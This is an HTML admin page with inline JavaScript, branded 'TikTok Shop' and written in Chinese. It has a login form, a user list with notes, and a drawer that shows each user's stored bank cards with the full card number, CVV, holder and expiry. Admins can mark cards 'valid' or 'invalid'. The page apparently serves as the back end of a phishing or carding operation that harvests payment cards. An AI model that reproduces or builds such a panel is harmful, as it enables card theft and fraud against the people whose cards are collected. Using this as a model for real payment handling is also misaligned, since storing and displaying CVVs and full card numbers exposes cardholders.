<!doctype html>
<html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin</title><link rel="stylesheet" href="../styles.css"></head>
<body><div id="app"></div><div class="toast"></div><div id="drawerOverlay" class="drawer-overlay"></div><aside id="drawer" class="detail-drawer"></aside><script src="../app.js"></script>
<script>
async function adminApi(path,opt={}){const r=await fetch(path,{credentials:"include",headers:{"Content-Type":"application/json",...(opt.headers||{})},...opt});let d={};try{d=await r.json()}catch{}if(!r.ok)throw new Error(d.error||"请求失败");return d}
async function showLogin(){document.getElementById("app").innerHTML=header()+`<main class="page center"><section class="auth-card"><div class="logo">TikTok <span>Shop</span></div><h2 style="text-align:center">Admin</h2><form id="af"><div class="field"><label>管理员账号</label><input id="aa" type="email" required></div><div class="field"><label>密码</label><input id="ap" type="password" required></div><button class="primary">登录</button></form></section></main>`;af.onsubmit=async e=>{e.preventDefault();try{await adminApi("/api/admin/auth",{method:"POST",body:JSON.stringify({email:aa.value.trim(),password:ap.value})});renderAdmin()}catch(err){toast(err.message)}}}
async function renderAdmin(){let data;try{data=await adminApi("/api/admin/users")}catch{return showLogin()}const users=data.users||[];document.getElementById("app").innerHTML=header()+`<main class="page admin"><div class="panel"><div style="display:flex;justify-content:space-between;align-items:center;gap:10px"><h1>用户管理</h1><button class="secondary" id="alo">退出</button></div><div class="searchbar"><input id="q" placeholder="搜索邮箱"></div><div style="overflow:auto;margin-top:15px"><table class="user-table"><thead><tr><th>邮箱</th><th>注册日期</th><th>银行卡</th><th>备注</th><th>操作</th></tr></thead><tbody id="tb"></tbody></table></div></div></main>`;function draw(q=""){tb.innerHTML=users.filter(u=>u.email.toLowerCase().includes(q.toLowerCase())).map(u=>`<tr><td>${esc(u.email)}</td><td>${esc(u.created_at)}</td><td>${u.card_count}</td><td>${esc(u.note||"—")}</td><td><button class="mini" onclick="openUser('${u.id}')">查看</button> <button class="mini" onclick="editNote('${u.id}','${esc(u.note||"")}')">备注</button></td></tr>`).join("")}draw();q.oninput=e=>draw(e.target.value);alo.onclick=async()=>{await adminApi("/api/admin/auth",{method:"DELETE"});showLogin()}}
window.editNote=async(id,note)=>{const v=prompt("编辑备注",note);if(v===null)return;await adminApi("/api/admin/users",{method:"PATCH",body:JSON.stringify({id,note:v})});renderAdmin()}
window.openUser=async id=>{const d=await adminApi("/api/admin/cards?user_id="+encodeURIComponent(id));const cs=d.cards||[];drawer.innerHTML=`<div class="modal-head"><h2>${esc(d.user.email)}</h2><button class="x" onclick="closeDrawer()">×</button></div><div style="overflow:auto"><table class="card-table"><thead><tr><th>银行</th><th>完整卡号</th><th>CVV</th><th>持卡人</th><th>有效期</th><th>网络</th><th>状态</th><th>默认</th><th>操作</th></tr></thead><tbody>${cs.map(c=>`<tr><td>${esc(c.bank)}</td><td style="font-family:monospace">${esc(c.card_number||c.number||c.pan||"—")}</td><td style="font-family:monospace">${esc(c.cvv||"—")}</td><td>${esc(c.holder)}</td><td>${esc(c.expiry)}</td><td>${esc(c.network||"")}</td><td>${esc(c.status)}</td><td>${c.is_default?"✓":"—"}</td><td><button class="mini" onclick="toggleStatus('${c.id}','${c.status==="valid"?"invalid":"valid"}','${id}')">${c.status==="valid"?"设无效":"设有效"}</button> <button class="danger" onclick="deleteCard('${c.id}','${id}')">删除</button></td></tr>`).join("")}</tbody></table></div>`;drawer.classList.add("open");drawerOverlay.classList.add("show")}
window.closeDrawer=()=>{drawer.classList.remove("open");drawerOverlay.classList.remove("show")};drawerOverlay.onclick=closeDrawer;
window.toggleStatus=async(id,status,uid)=>{await adminApi("/api/admin/cards",{method:"PATCH",body:JSON.stringify({id,action:"status",status})});openUser(uid)}
window.deleteCard=async(id,uid)=>{if(!confirm("确定删除这张银行卡？"))return;await adminApi("/api/admin/cards",{method:"DELETE",body:JSON.stringify({id})});openUser(uid)}
renderAdmin();
</script></body></html>
